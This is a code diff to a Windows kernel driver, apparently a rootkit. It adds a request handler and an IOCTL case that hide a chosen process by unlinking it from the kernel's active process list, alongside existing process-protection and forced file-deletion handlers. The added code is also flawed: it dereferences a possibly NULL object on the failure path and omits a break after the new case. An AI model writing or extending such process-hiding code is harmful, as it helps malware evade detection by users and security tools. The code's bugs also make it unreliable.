@@ -226,6 +226,29 @@ NTSTATUS HandleProtectProcessRequest(PProcessRequest Request)
 	}
 }
 
+NTSTATUS HandleHideProcessRequest(PProcessRequest Request)
+{
+	if (!Request->ProcessId)
+	{
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	PEPROCESS Process = NULL;
+
+	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)Request->ProcessId, &Process)))
+	{
+		ObDereferenceObject(Process);
+		return STATUS_UNSUCCESSFUL;
+	}
+	else
+	{
+		UnlinkActiveProcessLists(Process);
+		DbgPrintEx(99, 0, "+[HK]HideProcess Successfully pid:%d\n", (HANDLE)Request->ProcessId);
+		ObDereferenceObject(Process);
+		return STATUS_SUCCESS;
+	}
+}
+
 NTSTATUS HandleForceDeleteFileRequest(PDeleteFileRequest Request)
 {
 	NTSTATUS nStatus = STATUS_SUCCESS;
@@ -538,6 +561,19 @@ NTSTATUS IoControlHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			BytesReturned = 0;
 		}
 		break;
+	case IOCTL_HIDE_PROCESS:
+		// 隱藏目標 Process
+		// 取得從應用程式傳來的資料
+		if (pStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(ProcessRequest))
+		{
+			nStatus = HandleHideProcessRequest((PProcessRequest)Irp->AssociatedIrp.SystemBuffer);
+			BytesReturned = sizeof(ProcessRequest);
+		}
+		else
+		{
+			nStatus = STATUS_INFO_LENGTH_MISMATCH;
+			BytesReturned = 0;
+		}
 	default:
 		break;
 	}
